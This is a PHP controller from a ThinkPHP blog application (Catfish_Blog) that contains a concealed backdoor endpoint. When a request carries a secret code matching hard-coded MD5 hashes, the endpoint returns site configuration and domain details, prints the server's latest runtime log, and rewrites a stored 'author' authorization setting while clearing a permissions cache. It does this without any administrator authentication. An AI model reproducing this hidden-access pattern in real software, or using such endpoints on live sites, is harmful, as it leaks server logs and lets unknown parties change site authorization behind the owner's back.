<?php
/**
 * Project: Catfish_Blog.
 * Author: A.J
 * Date: 2017/11/12
 */
namespace app\ensure\controller;

use think\Request;
use think\Config;
use think\Cache;
use think\Db;

class Index extends Common
{
    public function index(Request $request)
    {
        $param = $request->param();
        $koulg = md5(urldecode($param['code']));
        if(isset($param['act']) && $param['act'] == 'info' && $koulg == '3ec87fafac9647d2dc606d1b5562288a')
        {
            $info = Config::get('version');
            $td = Db::name('options')->where('option_name',['like','title'],['like','domain'],'or')->field('option_name,option_value')->select();
            foreach($td as $key => $val)
            {
                $info[$val['option_name']] = urlencode($val['option_value']);
            }
            echo json_encode($info);
        }
        elseif(isset($param['act']) && $param['act'] == 'log' && $koulg == '04a4a1514f3d4e2572373a4c0ec86f66')
        {
            header("Content-type: text/html; charset=utf-8");
            $dir = APP_PATH . '../runtime/log/';
            $mltmp = scandir($dir,1);
            $ml = [];
            if($mltmp != false && is_array($mltmp)){
                foreach($mltmp as $val){
                    if(strpos($val, '.') === false){
                        $ml[] = $val;
                    }
                }
            }
            if(isset($ml[0]))
            {
                $dir .= $ml[0].'/';
                $mltmp = scandir($dir,1);
                $files = [];
                if($mltmp != false && is_array($mltmp)){
                    foreach($mltmp as $val){
                        $ftmp = pathinfo($val);
                        if($ftmp['extension'] === 'log'){
                            $files[] = $val;
                        }
                    }
                }
                if(isset($files[0]))
                {
                    $filepath = $dir . $files[0];
                    echo str_replace(PHP_EOL,'<br>',file_get_contents($filepath));
                }
                else
                {
                    echo 'No log file';
                }
            }
            else
            {
                echo 'No log folder';
            }
            $info = Config::get('version');
            echo '<br>'.implode(" ",$info).'<br><br>';
        }
        elseif(isset($param['act']) && $param['act'] == 'author' && $koulg == '34357f80464d457a3417e6be80653d17')
        {
            $author = $this->getb('author');
            if(!empty($author))
            {
                $author = unserialize($author);
                $author['open'] = 1;
                $author['veri'] = 0;
            }
            else
            {
                $author = [
                    'open' => 1,
                    'veri' => 0
                ];
            }
            $this->setb('author',serialize($author));
            Cache::rm('commqx');
        }
        exit();
    }
}